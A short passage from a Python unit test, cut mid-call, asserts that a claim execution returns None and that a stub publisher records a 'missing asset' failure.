        approvals=approval_repo, intents=intent_repo, license_normalizer=normalize_vendor_license,
    )
    assert claim.execute() is None
    assert stub_pubs.failed and "missing asset" in stub_pubs.failed[0]
